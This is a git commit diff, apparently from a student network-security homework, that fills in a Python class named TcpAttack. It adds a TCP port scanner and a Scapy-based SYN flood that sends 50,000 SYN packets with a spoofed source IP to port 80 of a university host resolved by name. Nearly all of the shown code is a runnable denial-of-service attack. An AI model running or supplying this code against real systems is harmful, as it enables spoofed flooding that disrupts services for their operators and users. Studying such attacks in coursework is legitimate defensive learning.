cf40f60df9f16aae6e2bd5aa529ee122c985bda0
Pat Sabpisal <ssabpisa@me.com>
2015-03-25 17:12:20 -0400

    Attack

--- SYNFlood/ssabpisa_hw08.py
+++ SYNFlood/ssabpisa_hw08.py
@@ -1,5 +1,6 @@
 import sys
 from socket import *
+from scapy.all import *
 
 class TcpAttack:
     def __init__(self, spoofIP, targetIP):
@@ -8,7 +9,7 @@ class TcpAttack:
 
     def scanTarget(self, rangeStart, rangeEnd):
         fj = open("openports.txt", "w")
-
+        openports = []
         for port in range(rangeStart, rangeEnd):
             print "Scanning port %5d" % port,
             s = socket(AF_INET, SOCK_STREAM)
@@ -17,17 +18,34 @@ class TcpAttack:
                 s.connect((self.targetIP, port))
                 print "[OPEN]"
                 fj.write(str(port))
+                openports.append(port)
             except Exception:
                 print
             finally:
                 s.close()
 
         fj.close()
+        return openports
 
     def attackTarget(self, port):
-        pass
+        try:
+            i = IP()
+            t = TCP()
+            i.src = self.spoofIP
+            i.dst = self.targetIP
+            t.sport = 10000
+            t.dport = port
+            t.flags = 'S'
+
+            for x in range(50000):
+                send(i/t)
+
+        except Exception as ex:
+            print "Unable to send SYN to target", ex
 
 
-# captive_dns_addr = gethostbyname("iprint1.ics.illinois.edu")
-Tcp = TcpAttack('128.210.7.199', '128.210.7.199')
-Tcp.scanTarget(70, 100)
+captive_dns_addr = gethostbyname("ecegrid.ecn.purdue.edu")
+Tcp = TcpAttack('128.210.7.199', captive_dns_addr)
+# Tcp.scanTarget(70, 1000)
+
+Tcp.attackTarget(80)
